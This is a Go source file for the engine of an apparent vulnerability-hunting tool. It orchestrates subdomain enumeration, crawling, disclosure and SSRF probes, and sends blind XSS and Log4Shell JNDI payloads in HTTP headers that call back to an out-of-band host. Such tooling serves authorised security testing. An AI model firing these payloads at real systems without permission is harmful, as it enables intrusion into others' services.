package core

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/GhostN3xus/Huntsuite/pkg/disclosure"
	"github.com/GhostN3xus/Huntsuite/pkg/mapper"
	"github.com/GhostN3xus/Huntsuite/pkg/oob"
	"github.com/GhostN3xus/Huntsuite/pkg/recon"
	"github.com/GhostN3xus/Huntsuite/pkg/validator"
)

// Engine coordinates reconnaissance, mapping, disclosure probing and validation.
type Engine struct {
	workers     int
	timeout     time.Duration
	quiet       bool
	outputPath  string
	wordlist    string
	httpTimeout time.Duration
	loggerMu    sync.Mutex
}

// NewEngine returns a configured engine with sane defaults.
func NewEngine() *Engine {
	return &Engine{
		workers:     50,
		timeout:     10 * time.Minute,
		httpTimeout: 8 * time.Second,
	}
}

// SetQuiet toggles log emission to stdout.
func (e *Engine) SetQuiet(quiet bool) { e.quiet = quiet }

// SetWorkers configures the worker pool size.
func (e *Engine) SetWorkers(n int) {
	if n > 0 {
		e.workers = n
	}
}

// SetOutput overrides the findings file path.
func (e *Engine) SetOutput(path string) { e.outputPath = path }

// SetWordlist overrides the recon wordlist path.
func (e *Engine) SetWordlist(path string) { e.wordlist = path }

// SetTimeout overrides the global scan timeout.
func (e *Engine) SetTimeout(d time.Duration) {
	if d > 0 {
		e.timeout = d
	}
}

// Scan performs the orchestrated scan against the provided target.
func (e *Engine) Scan(target string, oobDomain string) {
	ctx, cancel := context.WithTimeout(context.Background(), e.timeout)
	defer cancel()

	e.log("info", "scan-start", map[string]any{"target": target})

	reconEngine := recon.NewSimpleRecon()
	subdomains := reconEngine.EnumSubdomains(target, e.wordlist, 60)
	e.log("info", "recon-complete", map[string]any{"count": len(subdomains)})

	hosts := e.expandTargets(target, subdomains)
	mapperEngine := mapper.NewSiteMapper()
	e.runStage(ctx, "mapper", hosts, func(ctx context.Context, host string) {
		mapperEngine.Crawl(host, e.httpTimeout)
	})

	e.runStage(ctx, "disclosure", hosts, func(ctx context.Context, host string) {
		disclosure.Probe(host, int(e.httpTimeout/time.Second))
	})

	store, err := validator.InitDB(e.outputPath)
	if err != nil {
		e.log("error", "storage-init", map[string]any{"error": err.Error()})
		return
	}

	ic, err := oob.NewInteractClient()
	if err != nil {
		e.log("error", "oob-init", map[string]any{"error": err.Error()})
		return
	}
	if oobDomain != "" {
		e.log("info", "oob-custom", map[string]any{"domain": oobDomain})
	} else {
		e.log("info", "oob-domain", map[string]any{"domain": ic.Domain})
	}

	validator.SetInteractClientFactory(func() (*oob.InteractClient, error) { return ic, nil })
	defer validator.SetInteractClientFactory(nil)

	httpClient := &http.Client{Timeout: e.httpTimeout}
	tokenHosts := make(map[string]string)

	if len(hosts) > 0 {
		if _, err := validator.ProbeSSRF(store, hosts[0], "huntsuite"); err != nil {
			e.log("warn", "ssrf-probe-error", map[string]any{"error": err.Error()})
		}
	}

	for _, host := range hosts {
		bxssToken := ic.GenerateToken("bxss")
		tokenHosts[bxssToken] = host
		e.sendBlindXSS(ctx, httpClient, ic, host, bxssToken)

		log4jToken := ic.GenerateToken("log4j")
		tokenHosts[log4jToken] = host
		e.sendLog4Shell(ctx, httpClient, ic, host, log4jToken)
	}

	interactions, err := ic.CollectInteractions(ctx, 100)
	if err != nil && !errors.Is(err, context.DeadlineExceeded) && !errors.Is(err, context.Canceled) {
		e.log("warn", "oob-poll-error", map[string]any{"error": err.Error()})
	}
	grouped := groupInteractions(interactions, tokenHosts)
	for host, list := range grouped {
		if _, err := validator.ProcessInteractions(store, host, list); err != nil {
			e.log("warn", "interaction-process", map[string]any{"error": err.Error(), "host": host})
		}
	}

	e.log("info", "scan-complete", map[string]any{"targets": len(hosts)})
}

func (e *Engine) runStage(ctx context.Context, name string, hosts []string, fn func(context.Context, string)) {
	if len(hosts) == 0 {
		return
	}
	pool := newWorkerPool(ctx, e.workers)
	for _, host := range hosts {
		host := host
		pool.Submit(func(ctx context.Context) {
			fn(ctx, host)
		})
	}
	pool.Stop()
	e.log("info", name+"-complete", map[string]any{"targets": len(hosts)})
}

func (e *Engine) expandTargets(target string, subdomains []string) []string {
	base := ensureURL(target)
	set := map[string]struct{}{}
	set[base] = struct{}{}
	parsed, err := url.Parse(base)
	scheme := "https"
	if err == nil && parsed.Scheme != "" {
		scheme = parsed.Scheme
	}
	for _, sub := range subdomains {
		host := fmt.Sprintf("%s://%s", scheme, sub)
		set[host] = struct{}{}
	}
	out := make([]string, 0, len(set))
	for host := range set {
		out = append(out, host)
	}
	return out
}

func (e *Engine) sendBlindXSS(ctx context.Context, client *http.Client, ic *oob.InteractClient, target, token string) {
	payloadHost := trimScheme(ic.URLForToken(token))
	payload := fmt.Sprintf("<script src=//%s></script>", payloadHost)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		e.log("warn", "bxss-request", map[string]any{"error": err.Error()})
		return
	}
	req.Header.Set("User-Agent", "huntsuite/1.0")
	req.Header.Set("X-Huntsuite-BXSS", payload)
	if resp, err := client.Do(req); err == nil {
		resp.Body.Close()
	}
}

func (e *Engine) sendLog4Shell(ctx context.Context, client *http.Client, ic *oob.InteractClient, target, token string) {
	payloadHost := trimScheme(ic.URLForToken(token))
	payload := fmt.Sprintf("${jndi:ldap://%s/a}", payloadHost)
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		e.log("warn", "log4j-request", map[string]any{"error": err.Error()})
		return
	}
	req.Header.Set("User-Agent", "huntsuite/1.0")
	req.Header.Set("X-Huntsuite-Log4J", payload)
	if resp, err := client.Do(req); err == nil {
		resp.Body.Close()
	}
}

func groupInteractions(interactions []oob.Interaction, tokenHosts map[string]string) map[string][]oob.Interaction {
	grouped := map[string][]oob.Interaction{}
	for _, interaction := range interactions {
		token := extractToken(interaction.FullID)
		host, ok := tokenHosts[token]
		if !ok {
			continue
		}
		grouped[host] = append(grouped[host], interaction)
	}
	return grouped
}

func extractToken(fullID string) string {
	parts := strings.Split(fullID, ".")
	if len(parts) == 0 {
		return strings.TrimSpace(fullID)
	}
	return strings.TrimSpace(parts[0])
}

func ensureURL(target string) string {
	trimmed := strings.TrimSpace(target)
	if trimmed == "" {
		return ""
	}
	if !strings.HasPrefix(trimmed, "http://") && !strings.HasPrefix(trimmed, "https://") {
		trimmed = "https://" + trimmed
	}
	parsed, err := url.Parse(trimmed)
	if err != nil {
		return trimmed
	}
	parsed.RawQuery = ""
	parsed.Fragment = ""
	return strings.TrimSuffix(parsed.String(), "/")
}

func trimScheme(u string) string {
	u = strings.TrimPrefix(u, "https://")
	u = strings.TrimPrefix(u, "http://")
	return strings.TrimSuffix(u, "/")
}

func (e *Engine) log(level, message string, fields map[string]any) {
	if e.quiet && level == "info" {
		return
	}
	entry := map[string]any{
		"time":    time.Now().Format(time.RFC3339Nano),
		"level":   level,
		"message": message,
	}
	for k, v := range fields {
		entry[k] = v
	}
	data, err := json.Marshal(entry)
	if err != nil {
		return
	}
	e.loggerMu.Lock()
	fmt.Fprintln(os.Stdout, string(data))
	e.loggerMu.Unlock()
}

type workerPool struct {
	ctx   context.Context
	tasks chan func(context.Context)
	wg    sync.WaitGroup
}

func newWorkerPool(ctx context.Context, workers int) *workerPool {
	pool := &workerPool{ctx: ctx, tasks: make(chan func(context.Context))}
	for i := 0; i < workers; i++ {
		go pool.worker()
	}
	return pool
}

func (p *workerPool) worker() {
	for {
		select {
		case <-p.ctx.Done():
			return
		case task, ok := <-p.tasks:
			if !ok {
				return
			}
			task(p.ctx)
			p.wg.Done()
		}
	}
}

func (p *workerPool) Submit(task func(context.Context)) {
	p.wg.Add(1)
	p.tasks <- task
}

func (p *workerPool) Stop() {
	p.wg.Wait()
	close(p.tasks)
}
